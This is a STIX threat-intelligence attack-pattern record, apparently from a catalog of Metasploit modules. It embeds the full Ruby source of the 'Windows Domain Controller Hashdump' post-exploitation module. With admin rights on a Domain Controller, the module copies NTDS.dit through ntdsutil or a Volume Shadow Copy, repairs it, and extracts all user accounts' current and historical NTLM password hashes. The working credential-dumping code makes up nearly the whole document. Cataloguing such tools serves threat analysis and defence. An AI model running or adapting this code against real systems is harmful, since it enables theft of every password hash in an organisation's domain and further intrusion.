{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--da2deeda-483a-4d8d-882a-ff70c5c37e94",
    "created": "2024-08-14T16:33:08.759489Z",
    "modified": "2024-08-14T16:33:08.759493Z",
    "name": "Windows Domain Controller Hashdump",
    "description": " This module attempts to copy the NTDS.dit database from a live Domain Controller and then parse out all of the User Accounts. It saves all of the captured password hashes, including historical ones.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/domain_hashdump.rb",
            "external_id": "domain_hashdump.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/ntds/parser'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Accounts\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::ShadowCopy\n  include Msf::Post::File\n  include Msf::Post::Windows::ExtAPI\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Domain Controller Hashdump',\n        'Description' => %q{\n          This module attempts to copy the NTDS.dit database from a live Domain Controller\n          and then parse out all of the User Accounts. It saves all of the captured password\n          hashes, including historical ones.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['theLightCosine'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              extapi_ntds_parse\n              stdapi_fs_stat\n            ]\n          }\n        }\n      )\n    )\n    deregister_options('SMBUser', 'SMBPass', 'SMBDomain')\n    register_options(\n      [\n        OptBool.new(\n          'CLEANUP', [ true, 'Automatically delete ntds backup created', true]\n        )\n      ]\n    )\n  end\n\n  def run\n    if preconditions_met?\n      print_status 'Pre-conditions met, attempting to copy NTDS.dit'\n      ntds_file = copy_database_file\n      unless ntds_file.nil?\n        file_stat = client.fs.file.stat(ntds_file)\n        print_status \"NTDS File Size: #{file_stat.size} bytes\"\n        print_status 'Repairing NTDS database after copy...'\n        print_status repair_ntds(ntds_file)\n        realm = sysinfo['Domain']\n        begin\n          ntds_parser = Metasploit::Framework::NTDS::Parser.new(client, ntds_file)\n        rescue Rex::Post::Meterpreter::RequestError => e\n          print_bad(\"Failed to properly parse database: #{e}\")\n          if e.to_s.include? '1004'\n            print_bad('Error 1004 is likely a jet database error because the ntds database is not in the regular format')\n          end\n        end\n        unless ntds_parser.nil?\n          print_status 'Started up NTDS channel. Preparing to stream results...'\n          ntds_parser.each_account do |ad_account|\n            print_good ad_account.to_s\n            report_hash(ad_account.ntlm_hash.downcase, ad_account.name, realm)\n            ad_account.nt_history.each_with_index do |nt_hash, index|\n              hash_string = ad_account.lm_history[index] || Metasploit::Credential::NTLMHash::BLANK_LM_HASH\n              hash_string << \":#{nt_hash}\"\n              report_hash(hash_string.downcase, ad_account.name, realm)\n            end\n          end\n        end\n        if datastore['cleanup']\n          print_status \"Deleting backup of NTDS.dit at #{ntds_file}\"\n          rm_f(ntds_file)\n        else\n          print_bad \"#{ntds_file} requires manual cleanup\"\n        end\n      end\n    end\n  end\n\n  def copy_database_file\n    version = get_version_info\n    if version.windows_server?\n      if version.build_number.between?(Msf::WindowsVersion::Server2003_SP0, Msf::WindowsVersion::Server2003_SP2)\n        print_status 'Using Volume Shadow Copy Method'\n        return vss_method\n      elsif version.build_number >= Msf::WindowsVersion::Server2008_SP0\n        print_status 'Using NTDSUTIL method'\n        return ntdsutil_method\n      end\n    end\n    print_error 'This version of Windows is unsupported'\n    return nil\n  end\n\n  def ntds_exists?\n    return false unless ntds_location\n\n    file_exist?(\"#{ntds_location}\\\\ntds.dit\")\n  end\n\n  def ntds_location\n    @ntds_location ||= registry_getvaldata('HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\services\\\\NTDS\\\\Parameters\\\\', 'DSA Working Directory')\n  end\n\n  def ntdsutil_method\n    tmp_path = \"#{get_env('%WINDIR%')}\\\\Temp\\\\#{Rex::Text.rand_text_alpha((rand(8) + 6))}\"\n    command_arguments = \"\\\"activate instance ntds\\\" \\\"ifm\\\" \\\"Create Full #{tmp_path}\\\" quit quit\"\n    result = cmd_exec('ntdsutil.exe', command_arguments, 90)\n    if result.include? 'IFM media created successfully'\n      file_path = \"#{tmp_path}\\\\Active Directory\\\\ntds.dit\"\n      print_status \"NTDS database copied to #{file_path}\"\n    else\n      print_error 'There was an error copying the ntds.dit file!'\n      vprint_error result\n      file_path = nil\n    end\n    file_path\n  end\n\n  def preconditions_met?\n    unless is_admin?\n      print_error('This module requires Admin privs to run')\n      return false\n    end\n\n    print_status('Session has Admin privs')\n\n    unless domain_controller?\n      print_error('Host does not appear to be an AD Domain Controller')\n      return false\n    end\n\n    print_status('Session is on a Domain Controller')\n\n    unless ntds_exists?\n      print_error('Could not locate ntds.dit file')\n      return false\n    end\n\n    unless session.commands.include?(Rex::Post::Meterpreter::Extensions::Extapi::COMMAND_ID_EXTAPI_NTDS_PARSE)\n      fail_with(Failure::BadConfig, 'Session does not support Meterpreter ExtAPI NTDS parser')\n    end\n\n    session_compat?\n  end\n\n  def repair_ntds(path = '')\n    arguments = \"/p /o \\\"#{path}\\\"\"\n    cmd_exec('esentutl', arguments)\n  end\n\n  def report_hash(ntlm_hash, username, realm)\n    cred_details = {\n      origin_type: :session,\n      session_id: session_db_id,\n      post_reference_name: refname,\n      private_type: :ntlm_hash,\n      private_data: ntlm_hash,\n      username: username,\n      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\n      realm_value: realm,\n      workspace_id: myworkspace_id\n    }\n    create_credential(cred_details)\n  end\n\n  def session_compat?\n    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n      print_error 'You are running 32-bit Meterpreter on a 64 bit system'\n      print_error 'Try migrating to a 64-bit process and try again'\n      false\n    else\n      true\n    end\n  end\n\n  def vss_method\n    unless start_vss\n      fail_with(Failure::NoAccess, 'Unable to start VSS service')\n    end\n    location = ntds_location.dup\n    location.slice!(0, 3)\n    id = create_shadowcopy(volume.to_s)\n    print_status \"Getting Details of ShadowCopy #{id}\"\n    sc_details = get_sc_details(id)\n    sc_path = \"#{sc_details['DeviceObject']}\\\\#{location}\\\\ntds.dit\"\n    target_path = \"#{get_env('%WINDIR%')}\\\\Temp\\\\#{Rex::Text.rand_text_alpha((rand(8) + 6))}\"\n    print_status \"Moving ntds.dit to #{target_path}\"\n    move_file(sc_path, target_path)\n    target_path\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}